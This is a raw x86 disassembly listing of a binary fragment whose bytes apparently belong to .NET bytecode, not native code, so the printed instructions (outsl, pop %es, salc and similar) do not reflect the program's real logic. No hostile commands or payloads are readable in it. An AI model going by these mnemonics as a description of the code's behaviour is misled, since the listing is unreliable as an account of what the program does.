  4041aa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4041b0:	d3 00                	roll   %cl,(%eax)
  4041b2:	00 0a                	add    %cl,(%edx)
  4041b4:	07                   	pop    %es
  4041b5:	17                   	pop    %ss
  4041b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b7:	d4 00                	aam    $0x0
  4041b9:	00 0a                	add    %cl,(%edx)
  4041bb:	07                   	pop    %es
  4041bc:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041bf:	00 00                	add    %al,(%eax)
  4041c1:	0a 07                	or     (%edi),%al
  4041c3:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	04 6f                	add    $0x6f,%al
  4041ca:	d6                   	salc
  4041cb:	00 00                	add    %al,(%eax)
  4041cd:	0a 07                	or     (%edi),%al
  4041cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d0:	d7                   	xlat   %ds:(%ebx)
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	0a 06                	or     (%esi),%al
  4041d5:	07                   	pop    %es
  4041d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d7:	d8 00                	fadds  (%eax)
  4041d9:	00 0a                	add    %cl,(%edx)
  4041db:	17                   	pop    %ss
  4041dc:	73 d9                	jae    0x4041b7
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041e3:	07                   	pop    %es
  4041e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e5:	da 00                	fiaddl (%eax)
  4041e7:	00 0a                	add    %cl,(%edx)
  4041e9:	16                   	push   %ss
  4041ea:	07                   	pop    %es
  4041eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ec:	da 00                	fiaddl (%eax)
  4041ee:	00 0a                	add    %cl,(%edx)
  4041f0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041f3:	4c                   	dec    %esp
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 08                	or     (%eax),%cl
  4041f8:	03 16                	add    (%esi),%edx
  4041fa:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404200:	00 0a                	add    %cl,(%edx)
  404202:	08 6f db             	or     %ch,-0x25(%edi)
  404205:	00 00                	add    %al,(%eax)
  404207:	0a 02                	or     (%edx),%al
  404209:	7b 2b                	jnp    0x404236
  40420b:	00 00                	add    %al,(%eax)
  40420d:	04 73                	add    $0x73,%al
  40420f:	dc 00                	faddl  (%eax)
  404211:	00 0a                	add    %cl,(%edx)
  404213:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404218:	00 00                	add    %al,(%eax)
  40421a:	0a 1f                	or     (%edi),%bl
  40421c:	20 06                	and    %al,(%esi)
  40421e:	6f                   	outsl  %ds:(%esi),(%dx)
  40421f:	dd 00                	fldl   (%eax)
  404221:	00 0a                	add    %cl,(%edx)
  404223:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404226:	20 59 6f             	and    %bl,0x6f(%ecx)
  404229:	de 00                	fiadds (%eax)
  40422b:	00 0a                	add    %cl,(%edx)
  40422d:	13 04 06             	adc    (%esi,%eax,1),%eax
  404230:	16                   	push   %ss
  404231:	6a 6f                	push   $0x6f
  404233:	4e                   	dec    %esi
  404234:	00 00                	add    %al,(%eax)
  404236:	0a 06                	or     (%esi),%al
  404238:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40423b:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40423e:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  404245:	27                   	daa
  404246:	00 00                	add    %al,(%eax)
  404248:	00 09                	add    %cl,(%ecx)
  40424a:	39 06                	cmp    %eax,(%esi)
  40424c:	00 00                	add    %al,(%eax)
  40424e:	00 09                	add    %cl,(%ecx)
  404250:	6f                   	outsl  %ds:(%esi),(%dx)
  404251:	33 00                	xor    (%eax),%eax
  404253:	00 0a                	add    %cl,(%edx)
  404255:	dc 08                	fmull  (%eax)
  404257:	39 06                	cmp    %eax,(%esi)
  404259:	00 00                	add    %al,(%eax)
  40425b:	00 08                	add    %cl,(%eax)
  40425d:	6f                   	outsl  %ds:(%esi),(%dx)
  40425e:	33 00                	xor    (%eax),%eax
  404260:	00 0a                	add    %cl,(%edx)
  404262:	dc 07                	faddl  (%edi)
  404264:	39 06                	cmp    %eax,(%esi)
  404266:	00 00                	add    %al,(%eax)
  404268:	00 07                	add    %al,(%edi)
  40426a:	6f                   	outsl  %ds:(%esi),(%dx)
  40426b:	33 00                	xor    (%eax),%eax
  40426d:	00 0a                	add    %cl,(%edx)
  40426f:	dc 06                	faddl  (%esi)
  404271:	6f                   	outsl  %ds:(%esi),(%dx)
  404272:	dd 00                	fldl   (%eax)
  404274:	00 0a                	add    %cl,(%edx)
  404276:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  40427c:	00 06                	add    %al,(%esi)
  40427e:	39 06                	cmp    %eax,(%esi)
  404280:	00 00                	add    %al,(%eax)
  404282:	00 06                	add    %al,(%esi)
  404284:	6f                   	outsl  %ds:(%esi),(%dx)
  404285:	33 00                	xor    (%eax),%eax
  404287:	00 0a                	add    %cl,(%edx)
  404289:	dc 11                	fcoml  (%ecx)
  40428b:	05 2a 00 00 00       	add    $0x2a,%eax
  404290:	01 34 00             	add    %esi,(%eax,%eax,1)
  404293:	00 02                	add    %al,(%edx)
  404295:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  40429c:	00 00                	add    %al,(%eax)
  40429e:	00 00                	add    %al,(%eax)
  4042a0:	02 00                	add    (%eax),%al
  4042a2:	6a 00                	push   $0x0
  4042a4:	74 de                	je     0x404284
  4042a6:	00 0d 00 00 00 00    	add    %cl,0x0
  4042ac:	02 00                	add    (%eax),%al
  4042ae:	26 00 c5             	es add %al,%ch
  4042b1:	eb 00                	jmp    0x4042b3
  4042b3:	0d 00 00 00 00       	or     $0x0,%eax
  4042b8:	02 00                	add    (%eax),%al
  4042ba:	17                   	pop    %ss
  4042bb:	00 ee                	add    %ch,%dh
  4042bd:	05 01 0d 00 00       	add    $0xd01,%eax
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	1b 30                	sbb    (%eax),%esi
  4042c6:	05 00 50 01 00       	add    $0x15000,%eax
  4042cb:	00 17                	add    %dl,(%edi)
  4042cd:	00 00                	add    %al,(%eax)
  4042cf:	11 03                	adc    %eax,(%ebx)
  4042d1:	3a 0b                	cmp    (%ebx),%cl
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	00 72 0a             	add    %dh,0xa(%edx)
  4042d8:	27                   	daa
  4042d9:	00 70 73             	add    %dh,0x73(%eax)
  4042dc:	cf                   	iret
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	0a 7a 03             	or     0x3(%edx),%bh
  4042e2:	73 4d                	jae    0x404331
  4042e4:	00 00                	add    %al,(%eax)
  4042e6:	0a 0a                	or     (%edx),%cl
  4042e8:	73 d1                	jae    0x4042bb
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	0a 0b                	or     (%ebx),%cl
  4042ee:	07                   	pop    %es
  4042ef:	20 00                	and    %al,(%eax)
  4042f1:	01 00                	add    %eax,(%eax)
  4042f3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a 07                	or     (%edi),%al
  4042fa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404300:	d3 00                	roll   %cl,(%eax)
  404302:	00 0a                	add    %cl,(%edx)
  404304:	07                   	pop    %es
  404305:	17                   	pop    %ss
  404306:	6f                   	outsl  %ds:(%esi),(%dx)
  404307:	d4 00                	aam    $0x0
  404309:	00 0a                	add    %cl,(%edx)
  40430b:	07                   	pop    %es
  40430c:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  40430f:	00 00                	add    %al,(%eax)
  404311:	0a 07                	or     (%edi),%al
  404313:	02 7b 2a             	add    0x2a(%ebx),%bh
  404316:	00 00                	add    %al,(%eax)
  404318:	04 6f                	add    $0x6f,%al
  40431a:	d6                   	salc
  40431b:	00 00                	add    %al,(%eax)
  40431d:	0a 02                	or     (%edx),%al
  40431f:	7b 2b                	jnp    0x40434c
  404321:	00 00                	add    %al,(%eax)
  404323:	04 73                	add    $0x73,%al
  404325:	dc 00                	faddl  (%eax)
  404327:	00 0a                	add    %cl,(%edx)
  404329:	0c 08                	or     $0x8,%al
  40432b:	06                   	push   %es
  40432c:	6f                   	outsl  %ds:(%esi),(%dx)
  40432d:	dd 00                	fldl   (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	1f                   	pop    %ds
  404332:	20 06                	and    %al,(%esi)
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40433c:	20 59 6f             	and    %bl,0x6f(%ecx)
  40433f:	de 00                	fiadds (%eax)
  404341:	00 0a                	add    %cl,(%edx)
  404343:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404348:	00 00                	add    %al,(%eax)
  40434a:	01 13                	add    %edx,(%ebx)
  40434c:	04 06                	add    $0x6,%al
  40434e:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404351:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404354:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40435b:	02 09                	add    (%ecx),%cl
  40435d:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404360:	50                   	push   %eax
  404361:	00 00                	add    %al,(%eax)
  404363:	06                   	push   %es
  404364:	3a 0b                	cmp    (%ebx),%cl
  404366:	00 00                	add    %al,(%eax)
  404368:	00 72 38             	add    %dh,0x38(%edx)
  40436b:	27                   	daa
  40436c:	00 70 73             	add    %dh,0x73(%eax)
  40436f:	df 00                	filds  (%eax)
  404371:	00 0a                	add    %cl,(%edx)
  404373:	7a dd                	jp     0x404352
  404375:	0d 00 00 00 08       	or     $0x8000000,%eax
  40437a:	39 06                	cmp    %eax,(%esi)
  40437c:	00 00                	add    %al,(%eax)
  40437e:	00 08                	add    %cl,(%eax)
  404380:	6f                   	outsl  %ds:(%esi),(%dx)
  404381:	33 00                	xor    (%eax),%eax
  404383:	00 0a                	add    %cl,(%edx)
  404385:	dc 1f                	fcompl (%edi)
  404387:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  40438d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  404393:	1f                   	pop    %ds
  404394:	10 6f 45             	adc    %ch,0x45(%edi)
  404397:	00 00                	add    %al,(%eax)
  404399:	0a 26                	or     (%esi),%ah
  40439b:	07                   	pop    %es
  40439c:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043a2:	0a 06                	or     (%esi),%al
  4043a4:	07                   	pop    %es
  4043a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a6:	e1 00                	loope  0x4043a8
  4043a8:	00 0a                	add    %cl,(%edx)
  4043aa:	16                   	push   %ss
  4043ab:	73 d9                	jae    0x404386
  4043ad:	00 00                	add    %al,(%eax)
  4043af:	0a 13                	or     (%ebx),%dl
  4043b1:	06                   	push   %es
  4043b2:	06                   	push   %es
  4043b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043b4:	e2 00                	loop   0x4043b6
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	1f                   	pop    %ds
  4043b9:	10 6a 59             	adc    %ch,0x59(%edx)
  4043bc:	17                   	pop    %ss
  4043bd:	6a 58                	push   $0x58
  4043bf:	d4 8d                	aam    $0x8d
  4043c1:	44                   	inc    %esp
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	01 13                	add    %edx,(%ebx)
  4043c6:	07                   	pop    %es
  4043c7:	11 06                	adc    %eax,(%esi)
  4043c9:	11 07                	adc    %eax,(%edi)
  4043cb:	16                   	push   %ss
  4043cc:	11 07                	adc    %eax,(%edi)
  4043ce:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d1:	45                   	inc    %ebp
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043da:	13 08                	adc    (%eax),%ecx
  4043dc:	11 07                	adc    %eax,(%edi)
  4043de:	16                   	push   %ss
  4043df:	11 08                	adc    %ecx,(%eax)
  4043e1:	16                   	push   %ss
  4043e2:	11 08                	adc    %ecx,(%eax)
  4043e4:	8e 69 28             	mov    0x28(%ecx),%gs
  4043e7:	e3 00                	jecxz  0x4043e9
  4043e9:	00 0a                	add    %cl,(%edx)
  4043eb:	11 08                	adc    %ecx,(%eax)
  4043ed:	13 09                	adc    (%ecx),%ecx
  4043ef:	dd 29                	(bad) (%ecx)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 11                	add    %dl,(%ecx)
  4043f5:	06                   	push   %es
  4043f6:	39 07                	cmp    %eax,(%edi)
  4043f8:	00 00                	add    %al,(%eax)
  4043fa:	00 11                	add    %dl,(%ecx)
  4043fc:	06                   	push   %es
  4043fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4043fe:	33 00                	xor    (%eax),%eax
  404400:	00 0a                	add    %cl,(%edx)
  404402:	dc 07                	faddl  (%edi)
  404404:	39 06                	cmp    %eax,(%esi)
  404406:	00 00                	add    %al,(%eax)
  404408:	00 07                	add    %al,(%edi)
  40440a:	6f                   	outsl  %ds:(%esi),(%dx)
  40440b:	33 00                	xor    (%eax),%eax
  40440d:	00 0a                	add    %cl,(%edx)
  40440f:	dc 06                	faddl  (%esi)
  404411:	39 06                	cmp    %eax,(%esi)
  404413:	00 00                	add    %al,(%eax)
  404415:	00 06                	add    %al,(%esi)
  404417:	6f                   	outsl  %ds:(%esi),(%dx)
  404418:	33 00                	xor    (%eax),%eax
  40441a:	00 0a                	add    %cl,(%edx)
  40441c:	dc 11                	fcoml  (%ecx)
  40441e:	09 2a                	or     %ebp,(%edx)
  404420:	41                   	inc    %ecx
  404421:	64 00 00             	add    %al,%fs:(%eax)
  404424:	02 00                	add    (%eax),%al
  404426:	00 00                	add    %al,(%eax)
  404428:	5a                   	pop    %edx
  404429:	00 00                	add    %al,(%eax)
  40442b:	00 4f 00             	add    %cl,0x0(%edi)
  40442e:	00 00                	add    %al,(%eax)
  404430:	a9 00 00 00 0d       	test   $0xd000000,%eax
  404435:	00 00                	add    %al,(%eax)
  404437:	00 00                	add    %al,(%eax)
  404439:	00 00                	add    %al,(%eax)
  40443b:	00 02                	add    %al,(%edx)
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 e2                	add    %ah,%dl
  404441:	00 00                	add    %al,(%eax)
  404443:	00 42 00             	add    %al,0x0(%edx)
  404446:	00 00                	add    %al,(%eax)
  404448:	24 01                	and    $0x1,%al
  40444a:	00 00                	add    %al,(%eax)
  40444c:	0f 00 00             	sldt   (%eax)
  40444f:	00 00                	add    %al,(%eax)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 02                	add    %al,(%edx)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 1e                	add    %bl,(%esi)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 15 01 00 00 33    	add    %dl,0x33000001
  404461:	01 00                	add    %eax,(%eax)
  404463:	00 0d 00 00 00 00    	add    %cl,0x0
  404469:	00 00                	add    %al,(%eax)
  40446b:	00 02                	add    %al,(%edx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	00 18                	add    %bl,(%eax)
  404471:	00 00                	add    %al,(%eax)
  404473:	00 28                	add    %ch,(%eax)
  404475:	01 00                	add    %eax,(%eax)
  404477:	00 40 01             	add    %al,0x1(%eax)
  40447a:	00 00                	add    %al,(%eax)
  40447c:	0d 00 00 00 00       	or     $0x0,%eax
  404481:	00 00                	add    %al,(%eax)
  404483:	00 13                	add    %dl,(%ebx)
  404485:	30 03                	xor    %al,(%ebx)
  404487:	00 22                	add    %ah,(%edx)
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 18                	add    %bl,(%eax)
  40448d:	00 00                	add    %al,(%eax)
  40448f:	11 17                	adc    %edx,(%edi)
  404491:	0a 16                	or     (%esi),%dl
  404493:	0b 38                	or     (%eax),%edi
  404495:	11 00                	adc    %eax,(%eax)
  404497:	00 00                	add    %al,(%eax)
  404499:	03 07                	add    (%edi),%eax
  40449b:	91                   	xchg   %eax,%ecx
  40449c:	04 07                	add    $0x7,%al
  40449e:	91                   	xchg   %eax,%ecx
  40449f:	3b 02                	cmp    (%edx),%eax
  4044a1:	00 00                	add    %al,(%eax)
  4044a3:	00 16                	add    %dl,(%esi)
  4044a5:	0a 07                	or     (%edi),%al
  4044a7:	17                   	pop    %ss
  4044a8:	58                   	pop    %eax
  4044a9:	0b 07                	or     (%edi),%eax
  4044ab:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b1:	2a 00                	sub    (%eax),%al
  4044b3:	00 1b                	add    %bl,(%ebx)
  4044b5:	30 03                	xor    %al,(%ebx)
  4044b7:	00 6e 00             	add    %ch,0x0(%esi)
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	19 00                	sbb    %eax,(%eax)
  4044be:	00 11                	add    %dl,(%ecx)
  4044c0:	28 19                	sub    %bl,(%ecx)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	0a 02                	or     (%edx),%al
  4044c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044c7:	1f                   	pop    %ds
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	0a 0a                	or     (%edx),%cl
  4044cc:	73 e5                	jae    0x4044b3
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	0a 0b                	or     (%ebx),%cl
  4044d2:	07                   	pop    %es
  4044d3:	06                   	push   %es
  4044d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044d5:	8f 00                	pop    (%eax)
  4044d7:	00 0a                	add    %cl,(%edx)
  4044d9:	0a dd                	or     %ch,%bl
  4044db:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e0:	39 06                	cmp    %eax,(%esi)
  4044e2:	00 00                	add    %al,(%eax)
  4044e4:	00 07                	add    %al,(%edi)
  4044e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e7:	33 00                	xor    (%eax),%eax
  4044e9:	00 0a                	add    %cl,(%edx)
  4044eb:	dc 73 90             	fdivl  -0x70(%ebx)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044f3:	0d 16 13 04 38       	or     $0x38041316,%eax
  4044f8:	1f                   	pop    %ds
  4044f9:	00 00                	add    %al,(%eax)
  4044fb:	00 09                	add    %cl,(%ecx)
  4044fd:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404500:	13 05 08 12 05 72    	adc    0x72051208,%eax
  404506:	8e 27                	mov    (%edi),%fs
  404508:	00 70 28             	add    %dh,0x28(%eax)
  40450b:	91                   	xchg   %eax,%ecx
  40450c:	00 00                	add    %al,(%eax)
  40450e:	0a 6f 92             	or     -0x6e(%edi),%ch
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 26                	or     (%esi),%ah
  404515:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404518:	58                   	pop    %eax
  404519:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40451c:	04 09                	add    $0x9,%al
  40451e:	8e 69 32             	mov    0x32(%ecx),%gs
  404521:	da 08                	fimull (%eax)
  404523:	6f                   	outsl  %ds:(%esi),(%dx)
  404524:	38 00                	cmp    %al,(%eax)
  404526:	00 0a                	add    %cl,(%edx)
  404528:	6f                   	outsl  %ds:(%esi),(%dx)
  404529:	94                   	xchg   %eax,%esp
  40452a:	00 00                	add    %al,(%eax)
  40452c:	0a 2a                	or     (%edx),%ch
  40452e:	00 00                	add    %al,(%eax)
  404530:	01 10                	add    %edx,(%eax)
  404532:	00 00                	add    %al,(%eax)
  404534:	02 00                	add    (%eax),%al
  404536:	12 00                	adc    (%eax),%al
  404538:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  40453d:	00 00                	add    %al,(%eax)
  40453f:	00 1b                	add    %bl,(%ebx)
  404541:	30 02                	xor    %al,(%edx)
  404543:	00 22                	add    %ah,(%edx)
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1a                	add    %bl,(%edx)
  404549:	00 00                	add    %al,(%eax)
  40454b:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  40454e:	00 00                	add    %al,(%eax)
  404550:	0a 0a                	or     (%edx),%cl
  404552:	06                   	push   %es
  404553:	02 6f 8f             	add    -0x71(%edi),%ch
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0b                	or     (%ebx),%cl
  40455a:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404560:	39 06                	cmp    %eax,(%esi)
  404562:	00 00                	add    %al,(%eax)
  404564:	00 06                	add    %al,(%esi)
  404566:	6f                   	outsl  %ds:(%esi),(%dx)
  404567:	33 00                	xor    (%eax),%eax
  404569:	00 0a                	add    %cl,(%edx)
  40456b:	dc 07                	faddl  (%edi)
  40456d:	2a 00                	sub    (%eax),%al
  40456f:	00 01                	add    %al,(%ecx)
  404571:	10 00                	adc    %al,(%eax)
  404573:	00 02                	add    %al,(%edx)
  404575:	00 06                	add    %al,(%esi)
  404577:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  40457d:	00 00                	add    %al,(%eax)
  40457f:	00 13                	add    %dl,(%ebx)
  404581:	30 03                	xor    %al,(%ebx)
  404583:	00 3b                	add    %bh,(%ebx)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 1b                	add    %bl,(%ebx)
  404589:	00 00                	add    %al,(%eax)
  40458b:	11 73 90             	adc    %esi,-0x70(%ebx)
  40458e:	00 00                	add    %al,(%eax)
  404590:	0a 0a                	or     (%edx),%cl
  404592:	02 0b                	add    (%ebx),%cl
  404594:	16                   	push   %ss
  404595:	0c 38                	or     $0x38,%al
  404597:	1f                   	pop    %ds
  404598:	00 00                	add    %al,(%eax)
  40459a:	00 07                	add    %al,(%edi)
  40459c:	08 91 0d 06 72 94    	or     %dl,-0x6b8df9f3(%ecx)
  4045a2:	27                   	daa
  4045a3:	00 70 09             	add    %dh,0x9(%eax)
  4045a6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045aa:	01 28                	add    %ebp,(%eax)
  4045ac:	e6 00                	out    %al,$0x0
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b1:	92                   	xchg   %eax,%edx
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	0a 26                	or     (%esi),%ah
  4045b6:	08 17                	or     %dl,(%edi)
  4045b8:	58                   	pop    %eax
  4045b9:	0c 08                	or     $0x8,%al
  4045bb:	07                   	pop    %es
  4045bc:	8e 69 32             	mov    0x32(%ecx),%gs
  4045bf:	db 06                	fildl  (%esi)
  4045c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c2:	38 00                	cmp    %al,(%eax)
  4045c4:	00 0a                	add    %cl,(%edx)
  4045c6:	2a 00                	sub    (%eax),%al
  4045c8:	13 30                	adc    (%eax),%esi
  4045ca:	03 00                	add    (%eax),%eax
  4045cc:	3b 00                	cmp    (%eax),%eax
  4045ce:	00 00                	add    %al,(%eax)
  4045d0:	1b 00                	sbb    (%eax),%eax
  4045d2:	00 11                	add    %dl,(%ecx)
  4045d4:	73 90                	jae    0x404566
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	0a 0a                	or     (%edx),%cl
  4045da:	02 0b                	add    (%ebx),%cl
  4045dc:	16                   	push   %ss
  4045dd:	0c 38                	or     $0x38,%al
  4045df:	1f                   	pop    %ds
  4045e0:	00 00                	add    %al,(%eax)
  4045e2:	00 07                	add    %al,(%edi)
  4045e4:	08 91 0d 06 72 a4    	or     %dl,-0x5b8df9f3(%ecx)
  4045ea:	27                   	daa
  4045eb:	00 70 09             	add    %dh,0x9(%eax)
  4045ee:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045f2:	01 28                	add    %ebp,(%eax)
  4045f4:	e6 00                	out    %al,$0x0
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f9:	92                   	xchg   %eax,%edx
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	0a 26                	or     (%esi),%ah
  4045fe:	08 17                	or     %dl,(%edi)
  404600:	58                   	pop    %eax
  404601:	0c 08                	or     $0x8,%al
  404603:	07                   	pop    %es
  404604:	8e 69 32             	mov    0x32(%ecx),%gs
  404607:	db 06                	fildl  (%esi)
  404609:	6f                   	outsl  %ds:(%esi),(%dx)
  40460a:	38 00                	cmp    %al,(%eax)
  40460c:	00 0a                	add    %cl,(%edx)
  40460e:	2a 00                	sub    (%eax),%al
  404610:	13 30                	adc    (%eax),%esi
  404612:	04 00                	add    $0x0,%al
  404614:	2c 00                	sub    $0x0,%al
  404616:	00 00                	add    %al,(%eax)
  404618:	1c 00                	sbb    $0x0,%al
  40461a:	00 11                	add    %dl,(%ecx)
  40461c:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  404622:	00 01                	add    %al,(%ecx)
  404624:	0a 02                	or     (%edx),%al
  404626:	8e 69 17             	mov    0x17(%ecx),%gs
  404629:	59                   	pop    %ecx
  40462a:	0b 16                	or     (%esi),%edx
  40462c:	0c 38                	or     $0x38,%al
  40462e:	0e                   	push   %cs
  40462f:	00 00                	add    %al,(%eax)
  404631:	00 06                	add    %al,(%esi)
  404633:	08 02                	or     %al,(%edx)
  404635:	07                   	pop    %es
  404636:	91                   	xchg   %eax,%ecx
  404637:	9c                   	pushf
  404638:	07                   	pop    %es
  404639:	17                   	pop    %ss
  40463a:	59                   	pop    %ecx
  40463b:	0b 08                	or     (%eax),%ecx
  40463d:	17                   	pop    %ss
  40463e:	58                   	pop    %eax
  40463f:	0c 08                	or     $0x8,%al
  404641:	06                   	push   %es
  404642:	8e 69 32             	mov    0x32(%ecx),%gs
  404645:	ec                   	in     (%dx),%al
  404646:	06                   	push   %es
  404647:	2a 13                	sub    (%ebx),%dl
  404649:	30 02                	xor    %al,(%edx)
  40464b:	00 36                	add    %dh,(%esi)
  40464d:	00 00                	add    %al,(%eax)
  40464f:	00 01                	add    %al,(%ecx)
  404651:	00 00                	add    %al,(%eax)
  404653:	11 16                	adc    %edx,(%esi)
  404655:	0a 38                	or     (%eax),%bh
  404657:	15 00 00 00 02       	adc    $0x2000000,%eax
  40465c:	7b 38                	jnp    0x404696
  40465e:	00 00                	add    %al,(%eax)
  404660:	04 06                	add    $0x6,%al
  404662:	6f                   	outsl  %ds:(%esi),(%dx)
  404663:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  40466a:	00 06                	add    %al,(%esi)
  40466c:	06                   	push   %es
  40466d:	17                   	pop    %ss
  40466e:	58                   	pop    %eax
  40466f:	0a 06                	or     (%esi),%al
  404671:	02 7b 38             	add    0x38(%ebx),%bh
  404674:	00 00                	add    %al,(%eax)
  404676:	04 6f                	add    $0x6f,%al
  404678:	eb 00                	jmp    0x40467a
  40467a:	00 0a                	add    %cl,(%edx)
  40467c:	32 dd                	xor    %ch,%bl
  40467e:	02 7b 38             	add    0x38(%ebx),%bh
  404681:	00 00                	add    %al,(%eax)
  404683:	04 6f                	add    $0x6f,%al
  404685:	ec                   	in     (%dx),%al
  404686:	00 00                	add    %al,(%eax)
  404688:	0a 2a                	or     (%edx),%ch
  40468a:	00 00                	add    %al,(%eax)
  40468c:	13 30                	adc    (%eax),%esi
  40468e:	02 00                	add    (%eax),%al
  404690:	1b 00                	sbb    (%eax),%eax
  404692:	00 00                	add    %al,(%eax)
  404694:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  404699:	94                   	xchg   %eax,%esp
  40469a:	00 00                	add    %al,(%eax)
  40469c:	06                   	push   %es
  40469d:	0a 06                	or     (%esi),%al
  40469f:	02 7d 37             	add    0x37(%ebp),%bh
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	04 02                	add    $0x2,%al
  4046a6:	7b 38                	jnp    0x4046e0
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	04 06                	add    $0x6,%al
  4046ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ad:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046b2:	2a 00                	sub    (%eax),%al
  4046b4:	1b 30                	sbb    (%eax),%esi
  4046b6:	02 00                	add    (%eax),%al
  4046b8:	60                   	pusha
  4046b9:	00 00                	add    %al,(%eax)
  4046bb:	00 1e                	add    %bl,(%esi)
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4046c6:	7d 00                	jge    0x4046c8
  4046c8:	00 0a                	add    %cl,(%edx)
  4046ca:	0c 02                	or     $0x2,%al
  4046cc:	7b 38                	jnp    0x404706
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	04 6f                	add    $0x6f,%al
  4046d2:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046d7:	38 26                	cmp    %ah,(%esi)
  4046d9:	00 00                	add    %al,(%eax)
  4046db:	00 12                	add    %dl,(%edx)
  4046dd:	03 28                	add    (%eax),%ebp
  4046df:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  4046e4:	04 06                	add    $0x6,%al
  4046e6:	17                   	pop    %ss
  4046e7:	58                   	pop    %eax
